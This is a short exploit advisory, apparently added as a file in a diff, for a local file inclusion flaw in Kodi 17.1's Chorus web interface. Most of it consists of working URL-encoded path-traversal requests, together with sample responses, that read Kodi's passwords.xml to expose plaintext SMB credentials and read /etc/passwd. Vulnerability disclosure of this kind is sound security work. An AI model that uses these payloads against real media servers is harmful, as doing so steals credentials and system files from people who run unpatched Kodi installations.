@@ -1,0 +1,54 @@
+# Exploit Title: Kodi - Local File Inclusion
+# Date: 12 February 2017
+# Exploit Author: Eric Flokstra
+# Vendor Homepage: https://kodi.tv/
+# Software Link: https://kodi.tv/download/
+# Version: Kodi version 17.1 (Krypton), Chorus version 2.4.2
+# Tested on: Linux
+
+Kodi (formerly XBMC) is a free and open-source media player software
+application developed by the XBMC Foundation. Chorus is a web interface
+for controlling and interacting with Kodi. It is hosted by the Kodi
+installation.
+
+The web interface loads a thumbnail of an image, video or add-on when
+selecting a category in the left menu with the following request:
+
+http://192.168.1.25:8080/image/image%3A%2F%2F%252fhome%252fosmc%252f.kodi%252faddons%252fplugin.video.vice%252ficon.png%2F
+
+Insufficient validation of user input is performed on this URL resulting
+in a local file inclusion vulnerability. This enables attackers
+to retrieve arbitrary files from the filesystem by changing the location
+after the '/image/image%3A%2F%2F’ part.
+
+<--Examples-->
+
+1) If Kodi is connected to a NAS the following request can be used to obtain plain text SMB credentials:
+
+http://192.168.1.25:8080/image/image%3A%2F%2F%2e%2e%252fhome%252fosmc%252f.kodi%252fuserdata%252fpasswords.xml
+
+Response:
+
+<passwords><path><from pathversion="1">smb://192.168.1.15/</from><to
+pathversion="1">smb://username:password@192.168.1.15//share</to></path></passwords>
+
+2) Request to retrieve the content of /etc/passwd:
+
+http://192.168.1.25:8080/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd
+
+Response:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
